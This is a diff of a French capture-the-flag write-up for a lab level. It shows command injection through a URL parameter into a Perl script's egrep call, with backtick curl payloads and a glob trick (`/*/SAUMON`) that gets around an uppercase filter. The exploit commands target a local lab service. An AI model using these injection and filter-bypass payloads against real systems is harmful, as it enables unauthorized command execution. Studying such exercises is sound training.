@@ -40,24 +40,30 @@ on voit que les paramètres `x` et `y` sont utilisés, puis `..` est imprimé.
 `@output = egrep "^$xx" /tmp/xd 2>&1;` semble etre la ligne la plus interessante, on peut voir qu'on peut injecter du code via `$xx`.
 
 On essaye donc d'envoyer une commande via curl:
-``` curl 127.0.0.1:4646?x='`getflag > /tmp/flag`' ```
+```bash
+curl 127.0.0.1:4646?x='`getflag > /tmp/flag`'
+```
 
 ca ne fonctionne pas
 
 On peut voir dans le code que on passe tout ce qui est en lower case en upper case et qu'il supprime tout ce qui est apres un espace.
 
 On va donc creer un script qui va permettre d'appeler le getflag et on lui donne le droit d'execution `+x`.
+```bash
+echo 'getflag > /tmp/flag' > /tmp/SAUMON && chmod +x /tmp/SAUMON
+```
 
-`echo 'getflag > /tmp/flag' > /tmp/SAUMON && chmod +x /tmp/SAUMON`
-
-On l'execute avec ``` curl 127.0.0.1:4646?x=`/tmp/SAUMON`' ```
+On l'execute avec
+```bash
+curl 127.0.0.1:4646?x='`/tmp/SAUMON`'
+```
 
 Il y'a rien car tmp se transforme en TMP...
 
 On doit donc utiliser `*` a la place qui ne peut pas etre uppercase.
 
-``` curl 127.0.0.1:4646?x='`/*/SAUMON`' ```
+```bash
+curl 127.0.0.1:4646?x='`/*/SAUMON`'
+```
 
 Puis on affiche le fichier crée et on obtient alors le flag pour le level13.
-
-
